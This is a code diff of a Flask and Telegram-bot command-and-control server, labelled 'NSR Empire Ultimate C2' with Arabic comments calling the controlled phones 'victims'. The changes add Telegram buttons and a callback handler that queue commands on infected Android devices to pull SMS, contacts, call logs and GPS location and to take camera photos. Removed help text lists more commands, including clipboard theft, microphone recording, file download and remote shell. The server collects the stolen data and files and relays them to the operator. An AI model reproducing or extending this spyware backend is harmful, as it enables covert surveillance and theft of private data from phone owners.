@@ -3,6 +3,7 @@ import logging
 import threading
 from flask import Flask, request, jsonify
 import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -14,7 +15,7 @@ ADMIN_ID = os.environ.get('ADMIN_ID', '')
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None
 
-# تخزين الأجهزة المتصلة والمهام المعلقة لكل جهاز
+# تخزين الأجهزة المتصلة والمهام المعلقة
 connected_devices = {}
 pending_commands = {}
 
@@ -22,11 +23,11 @@ pending_commands = {}
 def index():
     return jsonify({
         "status": "online",
-        "system": "NSR Empire Advanced C2 Server",
+        "system": "NSR Empire Ultimate C2",
         "version": "7.11"
     }), 200
 
-# نقطة الاتصال الرئيسية للعميل (تتوافق مع C2Client.kt)
+# استقبال الاتصالات وطلب المهام من العميل
 @app.route('/api/v1/stream', methods=['POST', 'GET'])
 @app.route('/api/connect', methods=['POST'])
 def agent_connect():
@@ -38,21 +39,34 @@ def agent_connect():
         connected_devices[device_id] = data or {"status": "connected"}
         
         if is_new_device and bot and ADMIN_ID:
+            markup = InlineKeyboardMarkup()
+            markup.row(
+                InlineKeyboardButton("📞 المكالمات", callback_data=f"cmd:{device_id}:get_calls"),
+                InlineKeyboardButton("👥 الأسماء", callback_data=f"cmd:{device_id}:get_contacts")
+            )
+            markup.row(
+                InlineKeyboardButton("💬 الرسائل", callback_data=f"cmd:{device_id}:get_sms"),
+                InlineKeyboardButton("📍 الموقع", callback_data=f"cmd:{device_id}:get_location")
+            )
+            markup.row(
+                InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{device_id}:take_photo_front"),
+                InlineKeyboardButton("📷 كاميرا خلفية", callback_data=f"cmd:{device_id}:take_photo_back")
+            )
             bot.send_message(
                 ADMIN_ID,
-                f"🚨 <b>تم رصد اتصال جديد من جهاز ضحية!</b>\n\n"
-                f"📱 <b>معرف الجهاز:</b> <code>{device_id}</code>\n"
-                f"⚡ النظام جاهز لإعطاء الأوامر."
+                f"🚨 <b>تم رصد وسيط جديد والسيطرة عليه!</b>\n\n"
+                f"📱 <b>المعرف:</b> <code>{device_id}</code>",
+                reply_markup=markup
             )
         
-        # سحب الأمر المعلق وإرساله للعميل للتنفيذ
+        # سحب الأمر المعلق وإرساله للعميل للتنفيذ الفوري
         command_to_execute = pending_commands.pop(device_id, "wait")
         return jsonify({"status": "success", "command": command_to_execute}), 200
     except Exception as e:
         logger.error(f"Connect error: {e}")
         return jsonify({"error": str(e)}), 500
 
-# نقطة استقبال التقارير والبيانات (رسائل، جهات اتصال، مكالمات، موقع)
+# استقبال التقارير النصية والبيانات المستخرجة
 @app.route('/api/report', methods=['POST'])
 def agent_report():
     try:
@@ -64,22 +78,22 @@ def agent_report():
         task_type = data.get('task_type', 'General')
         content = data.get('content', 'No content')
         
-        logger.info(f"Report received [{task_type}] from {device_id}")
+        logger.info(f"Report [{task_type}] from {device_id}")
         
         if bot and ADMIN_ID:
-            report_msg = (
-                f"📥 <b>تقرير ميداني ناجح [{task_type}]</b>\n\n"
+            bot.send_message(
+                ADMIN_ID,
+                f"📥 <b>نتيجة مهمة ({task_type})</b>\n\n"
                 f"👤 <b>الضحية:</b> <code>{device_id}</code>\n\n"
-                f"📦 <b>البيانات المستخرجة:\n</b><code>{str(content)[:3500]}</code>"
+                f"📦 <code>{str(content)[:3500]}</code>"
             )
-            bot.send_message(ADMIN_ID, report_msg)
             
         return jsonify({"status": "received"}), 200
     except Exception as e:
         logger.error(f"Report error: {e}")
         return jsonify({"error": str(e)}), 500
 
-# نقطة استقبال الملفات والمستندات المسحوبة والوسائط (صور، تسجيلات، ملفات النظام)
+# استقبال الملفات والوسائط (صور، تسجيلات صوتية، ملفات مسحوبة)
 @app.route('/api/upload', methods=['POST'])
 def agent_upload():
     try:
@@ -88,18 +102,17 @@ def agent_upload():
         
         if 'file' in request.files:
             file = request.files['file']
-            filename = file.filename or 'captured_file.bin'
+            filename = file.filename or 'media_file.bin'
             file_bytes = file.read()
             
-            logger.info(f"File received [{filename}] from {device_id}")
+            logger.info(f"File uploaded [{filename}] from {device_id}")
             
             if bot and ADMIN_ID:
                 bot.send_message(
                     ADMIN_ID,
-                    f"📁 <b>تم استلام ملف/وسائط بنجاح!</b>\n\n"
-                    f"👤 <b>الضحية:</b> <code>{device_id}</code>\n"
-                    f"📂 <b>نوع المهمة:</b> <code>{task_type}</code>\n"
-                    f"📄 <b>اسم الملف:</b> <code>{filename}</code>"
+                    f"📁 <b>تم استلام ملف/وسائط بنجاح!</b>\n"
+                    f"👤 <b>الجهاز:</b> <code>{device_id}</code>\n"
+                    f"📂 <b>النوع:</b> <code>{task_type}</code>"
                 )
                 bot.send_document(ADMIN_ID, (filename, file_bytes))
                 
@@ -114,22 +127,9 @@ if bot:
         if str(message.from_user.id) != str(ADMIN_ID):
             return
         help_text = (
-            "👑 <b>لوحة تحكم إمبراطورية NSR C2 - الإصدار الحربي الشامل</b>\n\n"
-            "📋 <b>أوامر الإدارة:</b>\n"
-            "• /devices - عرض الأجهزة المتصلة\n"
-            "• /cmd [ID] [الأمر] - إرسال أمر للتنفيذ\n\n"
-            "⚔️ <b>الأوامر الميدانية الحقيقية المدعومة:</b>\n"
-            "  - <code>get_sms</code> : سحب الرسائل القصيرة\n"
-            "  - <code>get_contacts</code> : سحب دفتر الأرقام\n"
-            "  - <code>get_calls</code> : سحب سجل المكالمات\n"
-            "  - <code>get_location</code> : جلب احداثيات الـ GPS\n"
-            "  - <code>get_clipboard</code> : سحب الحافظة\n"
-            "  - <code>take_photo_front</code> : التقاط صورة كاميرا أمامية\n"
-            "  - <code>take_photo_back</code> : التقاط صورة كاميرا خلفية\n"
-            "  - <code>record_mic</code> : تسجيل صوت محيطي\n"
-            "  - <code>download:[مسار_الملف]</code> : سحب ملف من جهاز الضحية\n"
-            "  - <code>shell:[امر]</code> : تنفيذ أمر شل نظامي\n\n"
-            "<i>مثال:</i>\n<code>/cmd Android_Device_Client get_sms</code>"
+            "👑 <b>لوحة تحكم إمبراطورية NSR C2 - الأزرار التفاعلية</b>\n\n"
+            "• استخدم الأمر /devices لعرض قائمة الضحايا والتحكم بهم عبر الأزرار المباشرة.\n"
+            "• أو أرسل الأمر يدوياً بالصيغة:\n<code>/cmd [ID] [الأمر]</code>"
         )
         bot.reply_to(message, help_text)
 
@@ -141,10 +141,41 @@ if bot:
             bot.reply_to(message, "⚠️ لا توجد أجهزة متصلة حالياً.")
             return
             
-        msg = "🎯 <b>الأجهزة والضحايا النشطة:</b>\n\n"
         for dev_id in connected_devices.keys():
-            msg += f"💀 <code>{dev_id}</code>\n"
-        bot.reply_to(message, msg)
+            markup = InlineKeyboardMarkup()
+            markup.row(
+                InlineKeyboardButton("📞 المكالمات", callback_data=f"cmd:{dev_id}:get_calls"),
+                InlineKeyboardButton("👥 الأسماء", callback_data=f"cmd:{dev_id}:get_contacts")
+            )
+            markup.row(
+                InlineKeyboardButton("💬 الرسائل", callback_data=f"cmd:{dev_id}:get_sms"),
+                InlineKeyboardButton("📍 الموقع", callback_data=f"cmd:{dev_id}:get_location")
+            )
+            markup.row(
+                InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{dev_id}:take_photo_front"),
+                InlineKeyboardButton("📷 كاميرا خلفية", callback_data=f"cmd:{dev_id}:take_photo_back")
+            )
+            bot.send_message(
+                message.chat.id,
+                f"💀 <b>تحكم بالضحية:</b> <code>{dev_id}</code>",
+                reply_markup=markup
+            )
+
+    @bot.callback_query_handler(func=lambda call: True)
+    def callback_query(call):
+        if str(call.from_user.id) != str(ADMIN_ID):
+            return
+        data_parts = call.data.split(":")
+        if len(data_parts) == 3 and data_parts[0] == "cmd":
+            target_id = data_parts[1]
+            command_str = data_parts[2]
+            
+            pending_commands[target_id] = command_str
+            bot.answer_callback_query(call.id, f"تم حقن الأمر: {command_str}")
+            bot.send_message(
+                call.message.chat.id,
+                f"🚀 <b>تم إرسال الأمر للضحية <code>{target_id}</code>:</b> <code>{command_str}</code>\n⏳ سيتم التنفيذ في دورة الاتصال القادمة."
+            )
 
     @bot.message_handler(commands=['cmd'])
     def send_command(message):
@@ -152,20 +183,12 @@ if bot:
             return
         args = message.text.split(maxsplit=2)
         if len(args) < 3:
-            bot.reply_to(message, "⚠️ خطأ في الصيغة!\nالاستخدام: <code>/cmd [ID_الجهاز] [الأمر]</code>")
+            bot.reply_to(message, "⚠️ الاستخدام: <code>/cmd [ID] [الأمر]</code>")
             return
-            
         target_id = args[1]
         command_str = args[2]
-        
         pending_commands[target_id] = command_str
-        bot.reply_to(
-            message,
-            f"🚀 <b>تم حقن الأمر بنجاح!</b>\n\n"
-            f"• الأمر: <code>{command_str}</code>\n"
-            f"• الضحية: <code>{target_id}</code>\n"
-            f"⏳ سيتم التنفيذ فوراً في دورة الاتصال القادمة."
-        )
+        bot.reply_to(message, f"⏳ تم حقن الأمر <code>{command_str}</code> للجهاز <code>{target_id}</code>.")
 
     def run_bot():
         try:
